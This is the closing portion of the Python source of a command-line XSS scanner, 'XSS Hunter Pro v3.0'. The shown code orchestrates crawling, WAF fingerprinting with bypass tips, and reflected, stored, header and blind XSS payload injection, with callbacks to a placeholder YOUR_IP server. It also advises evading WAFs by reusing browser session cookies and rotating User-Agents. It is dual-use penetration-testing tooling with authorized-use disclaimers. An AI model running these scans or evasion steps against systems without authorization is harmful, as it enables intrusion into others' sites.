.vuln-detail td{{padding:6px 10px;border-top:1px solid #21262d;font-size:.85rem;vertical-align:top}}
.vd-label{{color:#8b949e;white-space:nowrap;width:120px;font-weight:600}}
.vd-value{{word-break:break-all}}
code,.payload-code{{background:#1c2128;padding:2px 6px;border-radius:3px;font-size:.82rem;color:#f0883e}}
.payload-code{{display:inline-block;max-width:100%;word-break:break-all}}
pre.evidence{{background:#1c2128;padding:8px;border-radius:5px;font-size:.8rem;color:#8b949e;white-space:pre-wrap;word-break:break-all;max-height:120px;overflow:auto}}
pre.manual-cmd{{background:#0d1117;border:1px solid #58a6ff;padding:10px;border-radius:5px;font-size:.82rem;color:#3fb950;white-space:pre-wrap;word-break:break-all}}
.foot{{text-align:center;margin-top:40px;color:#484f58;font-size:.8rem}}
</style></head><body><div class="wrap">
<h1>🔥 XSS Hunter Pro — Scan Report</h1>
<p class="sub">Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} &nbsp;│&nbsp; Target: <strong>{html_esc(target)}</strong></p>
<div class="disc">⚠️ <strong>Disclaimer:</strong> This report is for authorized security testing only.</div>

<h2>📊 Scan Summary</h2>
<div class="grid">
  <div class="card danger"><div class="num">{len(vulns)}</div><div class="lbl">Vulnerabilities</div></div>
  <div class="card"><div class="num">{len(pages)}</div><div class="lbl">Pages Crawled</div></div>
  <div class="card"><div class="num">{stats.get('forms',0)}</div><div class="lbl">Forms Found</div></div>
  <div class="card"><div class="num">{len(points)}</div><div class="lbl">Injection Points</div></div>
  <div class="card warn"><div class="num">{stats.get('payloads_sent',0)}</div><div class="lbl">Payloads Sent</div></div>
  <div class="card ok"><div class="num">{stats.get('duration','?')}s</div><div class="lbl">Duration</div></div>
</div>

<h2>🌐 Crawled Pages &amp; Parameters</h2>
<table class="main"><thead><tr>
  <th>#</th><th>Status</th><th>URL</th><th>URL Params</th><th>Form Fields</th><th>Vulns</th>
</tr></thead><tbody>{pages_rows}</tbody></table>

<h2>🔥 Vulnerabilities — Detail &amp; Manual Reproduction</h2>
{'<p style="color:#3fb950;margin:10px 0">✅ No vulnerabilities found. The target appears safe against the tested payloads.</p>' if not vulns else vuln_cards}

<p class="foot">XSS Hunter Pro v3.0 — For authorized security testing only.</p>
</div></body></html>"""

    with open(fp, 'w', encoding='utf-8') as f: f.write(html)
    return fp


# ═══════════════════════════════════════════════════════════════════════
# MAIN SCANNER ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════

def run_scan(args):
    banner()
    t0 = time.time()

    # ── Config summary ──
    section("SCAN CONFIGURATION")
    url = clean_url(args.url)
    if not is_valid_url(url):
        error(f"Invalid URL: {url}"); sys.exit(1)

    # Build a pretty config table
    widths = [24, 52]
    table_header(["Setting","Value"], widths)
    configs = [
        ("Target", url),
        ("Mode", "Full Crawl (depth="+str(args.depth)+")" if args.crawl else "Single Page"),
        ("Scan Types", ", ".join(filter(None, [
            "Reflected" if not args.stored_only and not args.blind_only else None,
            "Stored" if not args.reflected_only and not args.blind_only else None,
            "Blind" if (args.blind or args.blind_only) and args.callback_url else None,
            "Headers" if getattr(args, 'scan_headers', False) else None,
        ])) or "Reflected, Stored"),
        ("Param Discovery", "Enabled" if getattr(args, 'discover_params', False) else "Disabled"),
        ("Encoding Retry", "Enabled (auto-retry encoded variants)"),
        ("Payload File", args.payload_file or "Built-in only"),
        ("Proxy", args.proxy or "None"),
        ("Cookies", trunc(args.cookies,45) if args.cookies else "None"),
        ("Delay", f"{args.delay}s" if args.delay else "0 (adaptive throttle)"),
        ("Timeout", f"{args.timeout}s"),
    ]
    for k,v in configs:
        table_row([k,v], widths, [Fore.CYAN, Fore.WHITE])
    table_footer(widths)

    # ── Init HTTP client ──
    hdrs = None
    if args.headers:
        try: hdrs = json.loads(args.headers)
        except: error("--headers must be valid JSON"); sys.exit(1)

    http = HTTPClient(cookies=args.cookies, headers=hdrs, proxy=args.proxy,
                      auth_type=args.auth_type, auth_cred=args.auth_cred,
                      timeout=args.timeout,
                      user_agent=getattr(args,'user_agent',None))

    custom = load_custom_payloads(args.payload_file)

    # ── Phase 1: Crawl ──
    section("PHASE 1 — CRAWLING & DISCOVERY")
    crawler = Crawler(http, max_depth=args.depth, delay=args.delay, max_pages=args.max_pages)
    if args.crawl:
        pages, points = crawler.crawl(url)
    else:
        pages, points = crawler.crawl(url)  # still do BFS from the single page

    info(f"Crawl complete!")
    print()

    # Pretty crawl summary table
    widths_c = [6, 52, 6, 8]
    table_header(["#", "Page URL", "Params", "Forms"], widths_c)
    for i, pg in enumerate(pages, 1):
        pts = [p for p in points if p.url == pg]
        up = len([p for p in pts if p.param_type == 'url_param'])
        fp = len([p for p in pts if p.param_type != 'url_param'])
        table_row([str(i), trunc(pg,50), str(up), str(fp)], widths_c,
                  [Fore.WHITE, Fore.CYAN, Fore.YELLOW, Fore.YELLOW])
    table_footer(widths_c)

    info(f"{Fore.GREEN}{len(pages)}{RESET} pages  │  "
         f"{Fore.GREEN}{crawler.forms_count}{RESET} forms  │  "
         f"{Fore.GREEN}{len(points)}{RESET} injection points")

    if not points:
        if crawler.waf_blocked:
            warn("Scan blocked by WAF/firewall — no pages could be crawled.")
            warn("")
            warn(f"{Fore.CYAN}┌─ How to scan WAF-protected targets ─────────────────────────────┐{RESET}")
            warn(f"{Fore.CYAN}│{RESET}  1. Get a real session cookie from your browser:               {Fore.CYAN}│{RESET}")
            warn(f"{Fore.CYAN}│{RESET}     Open DevTools → Application → Cookies → copy all values   {Fore.CYAN}│{RESET}")
            warn(f"{Fore.CYAN}│{RESET}     --cookies 'session=abc123; _csrf=xyz789'                  {Fore.CYAN}│{RESET}")
            warn(f"{Fore.CYAN}│{RESET}                                                               {Fore.CYAN}│{RESET}")
            warn(f"{Fore.CYAN}│{RESET}  2. Scan a specific endpoint (not just the homepage):          {Fore.CYAN}│{RESET}")
            warn(f"{Fore.CYAN}│{RESET}     -u '{url.rstrip('/')}/search?q=test'                      {Fore.CYAN}│{RESET}")
            warn(f"{Fore.CYAN}│{RESET}                                                               {Fore.CYAN}│{RESET}")
            warn(f"{Fore.CYAN}│{RESET}  3. Add a delay between requests: --delay 2                   {Fore.CYAN}│{RESET}")
            warn(f"{Fore.CYAN}│{RESET}                                                               {Fore.CYAN}│{RESET}")
            warn(f"{Fore.CYAN}│{RESET}  4. Route through Burp Suite to see what's being blocked:     {Fore.CYAN}│{RESET}")
            warn(f"{Fore.CYAN}│{RESET}     --proxy http://127.0.0.1:8080                             {Fore.CYAN}│{RESET}")
            warn(f"{Fore.CYAN}│{RESET}                                                               {Fore.CYAN}│{RESET}")
            warn(f"{Fore.CYAN}│{RESET}  5. For SPA/React/Next.js apps, scan the API directly:        {Fore.CYAN}│{RESET}")
            warn(f"{Fore.CYAN}│{RESET}     -u '{url.rstrip('/')}/api/v1/search?q=test'               {Fore.CYAN}│{RESET}")
            warn(f"{Fore.CYAN}└─────────────────────────────────────────────────────────────────┘{RESET}")
        elif crawler.is_spa:
            warn("No injectable parameters found — site is a JavaScript SPA.")
            warn("All content is rendered by JavaScript in the browser.")
            warn("")
            warn("Try scanning known API/search endpoints directly, for example:")
            warn(f"  python3 xss_scanner.py -u '{url.rstrip('/')}/search?q=test'")
            warn(f"  python3 xss_scanner.py -u '{url.rstrip('/')}/api/search?query=test'")
        else:
            warn("No injection points found. Try a page with forms or URL parameters.")
        section("SCAN COMPLETE"); return

    # Pretty injection points table
    print()
    info("Discovered injection points:")
    widths_p = [4, 38, 6, 16, 14]
    table_header(["#", "Page", "Meth", "Parameter", "Type"], widths_p)
    for i, pt in enumerate(points[:50], 1):  # Show first 50
        table_row([str(i), trunc(urlparse(pt.url).path,36), pt.method,
                   trunc(pt.param_name,14), pt.param_type],
                  widths_p,
                  [Fore.WHITE, Fore.CYAN, Fore.YELLOW, Fore.GREEN, Fore.MAGENTA])
    if len(points) > 50:
        dim(f"  ... and {len(points)-50} more")
    table_footer(widths_p)

    # ── Phase 1B: CSP & WAF Analysis ──
    section("PHASE 1B — SECURITY HEADER & WAF ANALYSIS")
    initial_resp = http.get(url)
    # WAF Fingerprinting
    waf_fp = WAFFingerprinter()
    detected_wafs = waf_fp.fingerprint(initial_resp)
    if detected_wafs:
        for waf in detected_wafs:
            warn(f"WAF Detected: {Fore.RED}{Style.BRIGHT}{waf}{RESET}")
            tips = WAFFingerprinter.get_bypass_tips(waf)
            for tip in tips[:2]:
                dim(f"    → {tip}")
    else:
        info(f"No WAF detected — payloads should reach the server unfiltered.")

    # CSP Analysis
    csp = CSPAnalyzer()
    csp_findings = csp.analyze(initial_resp)
    if csp_findings:
        for sev, title, desc in csp_findings:
            sev_c = Fore.RED if sev in ('CRITICAL','HIGH') else Fore.YELLOW if sev == 'MEDIUM' else Fore.WHITE
            print(f"    {sev_c}[{sev}]{RESET} {title}")
    print()

    # ── Phase 1C: Parameter Discovery (optional) ──
    if getattr(args, 'discover_params', False):
        section("PHASE 1C — HIDDEN PARAMETER DISCOVERY")
        discoverer = ParamDiscovery(http, delay=args.delay)
        new_points = discoverer.discover(pages)
        if new_points:
            info(f"Discovered {Fore.GREEN}{len(new_points)}{RESET} hidden reflecting parameters!")
            for np in new_points:
                dim(f"    + {np.param_name} @ {trunc(np.url, 50)}")
            points.extend(new_points)
        else:
            dim("No additional hidden parameters found.")
        print()

    payloads_reflected = list(OrderedDict.fromkeys(all_reflected_payloads() + custom))
    payloads_stored = list(OrderedDict.fromkeys(all_stored_payloads() + custom))
    info(f"Payload arsenal: {Fore.YELLOW}{len(payloads_reflected)}{RESET} reflected, "
         f"{Fore.YELLOW}{len(payloads_stored)}{RESET} stored, "
         f"{Fore.YELLOW}{len(BLIND_TEMPLATES)}{RESET} blind templates")

    all_vulns = []
    total_sent = 0
    scan_log = []

    # ── Phase 2A: Reflected XSS ──
    if not args.stored_only and not args.blind_only:
        section("PHASE 2A — REFLECTED XSS TESTING")
        scanner = ReflectedScanner(http, payloads_reflected, custom, delay=args.delay)
        reflected = scanner.scan(points)
        all_vulns.extend(reflected)
        total_sent += scanner.sent
        success(f"Reflected scan done. {Fore.RED}{len(reflected)}{RESET} vulns, {scanner.sent} payloads sent.")

    # ── Phase 2B: Stored XSS ──
    if not args.reflected_only and not args.blind_only:
        section("PHASE 2B — STORED XSS TESTING")
        scanner = StoredScanner(http, payloads_stored, custom, delay=args.delay)
        stored = scanner.scan(points, pages)
        all_vulns.extend(stored)
        total_sent += scanner.sent
        success(f"Stored scan done. {Fore.RED}{len(stored)}{RESET} vulns, {scanner.sent} payloads sent.")

    # ── Phase 2C: Header Injection XSS ──
    if getattr(args, 'scan_headers', False):
        section("PHASE 2C — HEADER INJECTION XSS TESTING")
        hdr_scanner = HeaderInjectionScanner(http, delay=args.delay)
        hdr_vulns = hdr_scanner.scan(pages)
        all_vulns.extend(hdr_vulns)
        total_sent += hdr_scanner.sent
        success(f"Header injection scan done. {Fore.RED}{len(hdr_vulns)}{RESET} vulns, {hdr_scanner.sent} payloads sent.")

    # ── Phase 2D: Blind XSS ──
    if (args.blind or args.blind_only) and args.callback_url:
        section("PHASE 2D — BLIND XSS TESTING")
        scanner = BlindScanner(http, args.callback_url,
                               inject_headers=args.inject_headers, delay=args.delay)
        blind_log = scanner.scan(points, pages)
        total_sent += scanner.sent
        success(f"Blind scan done. {scanner.sent} payloads injected across {len(blind_log)} targets.")
        info("Monitor your callback server for incoming triggers!")

    # ── Phase 3: Report Generation ──
    duration = round(time.time() - t0, 1)
    stats = {
        'forms': crawler.forms_count,
        'payloads_sent': total_sent,
        'duration': duration,
        'wafs_detected': detected_wafs,
        'csp_findings': len(csp_findings),
        'pages_crawled': len(pages),
        'injection_points': len(points),
    }
    section("PHASE 3 — REPORT GENERATION")
    report_path = generate_report(url, all_vulns, pages, points, stats, scan_log)
    success(f"HTML report → {Fore.CYAN}{report_path}{RESET}")
    info(f"Open it: {Fore.WHITE}open {report_path}{RESET}")

    # JSON/CSV export
    json_path = export_json(url, all_vulns, stats)
    success(f"JSON export → {Fore.CYAN}{json_path}{RESET}")
    if len(all_vulns) > 0:
        csv_path = export_csv(url, all_vulns)
        success(f"CSV export  → {Fore.CYAN}{csv_path}{RESET}")

    # ── Final Summary ──
    section("SCAN COMPLETE — RESULTS")

    widths_s = [30, 24]
    table_header(["Metric","Value"], widths_s)
    summary_data = [
        ("Target", trunc(url, 22)),
        ("Duration", f"{duration}s"),
        ("Pages Crawled", str(len(pages))),
        ("Forms Discovered", str(crawler.forms_count)),
        ("Injection Points", str(len(points))),
        ("Total Payloads Sent", str(total_sent)),
        ("Vulnerabilities Found", str(len(all_vulns))),
    ]
    for k,v in summary_data:
        c = Fore.RED+Style.BRIGHT if k=="Vulnerabilities Found" and len(all_vulns)>0 else Fore.GREEN
        table_row([k,v], widths_s, [Fore.CYAN, c])
    table_footer(widths_s)

    if all_vulns:
        print()
        vuln_msg(f"🔥  {len(all_vulns)} VULNERABILITIES FOUND!")
        print()
        widths_v = [4, 10, 10, 36, 16]
        table_header(["#","Type","Severity","URL","Parameter"], widths_v)
        for i, v in enumerate(all_vulns, 1):
            sev = v.get('severity','?')
            sev_c = Fore.RED+Style.BRIGHT if sev=='CRITICAL' else Fore.RED if sev=='HIGH' else Fore.YELLOW
            table_row([str(i), v.get('xss_type',''), sev,
                       trunc(v.get('url',''),34), v.get('parameter','')],
                      widths_v,
                      [Fore.WHITE, Fore.MAGENTA, sev_c, Fore.CYAN, Fore.GREEN])
        table_footer(widths_v)

        # Show manual reproduction steps
        print()
        info(f"{Fore.WHITE}{Style.BRIGHT}MANUAL REPRODUCTION STEPS:{RESET}")
        for i, v in enumerate(all_vulns, 1):
            print(f"\n    {Fore.RED}{Style.BRIGHT}━━━ Vuln #{i}: {v.get('xss_type','')} XSS on {Fore.YELLOW}{v.get('parameter','')}{RESET}")
            print(f"    {Fore.CYAN}URL:{RESET}     {v.get('url','')}")
            print(f"    {Fore.CYAN}Param:{RESET}   {v.get('parameter','')} ({v.get('param_type','')})")
            print(f"    {Fore.CYAN}Context:{RESET} {v.get('context','')}")
            print(f"    {Fore.CYAN}Payload:{RESET} {Fore.YELLOW}{v.get('payload','')}{RESET}")
            manual = v.get('manual_test','')
            if manual:
                for line in manual.split('\n'):
                    print(f"    {Fore.GREEN}$ {line}{RESET}")
    else:
        print()
        success("No vulnerabilities found. Target looks clean against tested payloads! 🛡️")

    print()


# ═══════════════════════════════════════════════════════════════════════
# CLI ARGUMENT PARSER
# ═══════════════════════════════════════════════════════════════════════

def parse_args():
    p = argparse.ArgumentParser(
        description=f"{Fore.RED}XSS Hunter Pro v3.0{RESET} — Advanced XSS Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Fore.CYAN}Examples:{RESET}
  Full domain crawl:
    python3 xss_scanner.py -u http://testphp.vulnweb.com/ --crawl --depth 3

  Single page scan:
    python3 xss_scanner.py -u "http://testphp.vulnweb.com/search.php?test=query"

  With custom payloads + header injection + param discovery:
    python3 xss_scanner.py -u http://target.com --crawl --payload-file payloads.txt \\
      --scan-headers --discover-params

  Blind XSS with email alerts:
    python3 xss_scanner.py -u http://target.com --crawl --blind \\
      --callback-url http://YOUR_IP:8888/cb \\
      --email you@mail.com --smtp-host smtp.gmail.com \\
      --smtp-port 587 --smtp-user you@gmail.com --smtp-pass pass

  Through proxy (Burp Suite):
    python3 xss_scanner.py -u http://target.com --crawl --proxy http://127.0.0.1:8080

  Full deep scan (all features):
    python3 xss_scanner.py -u http://target.com --crawl --depth 4 \\
      --scan-headers --discover-params --delay 1

{Fore.YELLOW}⚠  LEGAL: Only use on targets you have permission to test.{RESET}
""")
    g = p.add_argument_group('Target')
    g.add_argument('-u','--url', required=True, help='Target URL or domain')

    g = p.add_argument_group('Crawling')
    g.add_argument('--crawl', action='store_true', help='Crawl entire domain')
    g.add_argument('--depth', type=int, default=3, help='Crawl depth (default:3)')
    g.add_argument('--max-pages', type=int, default=500, help='Max pages (default:500)')

    g = p.add_argument_group('Performance')
    g.add_argument('--delay', type=float, default=0, help='Delay between requests (sec)')
    g.add_argument('--timeout', type=int, default=10, help='Request timeout (sec)')

    g = p.add_argument_group('Payloads')
    g.add_argument('--payload-file', help='Custom payload file (one per line)')

    g = p.add_argument_group('Scan Types')
    g.add_argument('--reflected-only', action='store_true', help='Only scan for reflected XSS')
    g.add_argument('--stored-only', action='store_true', help='Only scan for stored XSS')
    g.add_argument('--blind-only', action='store_true', help='Only scan for blind XSS')
    g.add_argument('--blind', action='store_true', help='Enable blind XSS (requires --callback-url)')

    g = p.add_argument_group('Advanced Scanning')
    g.add_argument('--scan-headers', action='store_true', dest='scan_headers',
                   help='Test XSS via HTTP request headers (Referer, User-Agent, X-Forwarded-For, etc.)')
    g.add_argument('--discover-params', action='store_true', dest='discover_params',
                   help='Fuzz for hidden/undocumented URL parameters that reflect')

    g = p.add_argument_group('Blind XSS')
    g.add_argument('--callback-url', help='Callback URL for blind XSS')
    g.add_argument('--inject-headers', action='store_true', help='Inject blind payloads into HTTP headers too')

    g = p.add_argument_group('Email Alerts')
    g.add_argument('--email', help='Alert email for blind XSS')
    g.add_argument('--smtp-host', help='SMTP host')
    g.add_argument('--smtp-port', type=int, default=587)
    g.add_argument('--smtp-user', help='SMTP user')
    g.add_argument('--smtp-pass', help='SMTP password')

    g = p.add_argument_group('Auth')
    g.add_argument('--cookies', help='Cookies: "session=abc; tok=xyz"')
    g.add_argument('--headers', help='Custom headers as JSON')
    g.add_argument('--auth-type', choices=['basic','bearer'])
    g.add_argument('--auth-cred', help='user:pass or token')

    g = p.add_argument_group('Browser Impersonation')
    g.add_argument('--user-agent', help='Custom User-Agent string (auto-rotated by default)')
    g.add_argument('--rotate-ua', action='store_true', help='Rotate User-Agent on every request')

    g = p.add_argument_group('Proxy')
    g.add_argument('--proxy', help='Proxy URL (e.g. http://127.0.0.1:8080)')

    return p.parse_args()


# ═══════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════

if __name__ == '__main__':
    try:
        args = parse_args()
        run_scan(args)
    except KeyboardInterrupt:
        print(f"\n\n    {Fore.YELLOW}[!] Scan interrupted by user.{RESET}\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n    {Fore.RED}[✗] Fatal error: {e}{RESET}")
        import traceback; traceback.print_exc()
        sys.exit(1)
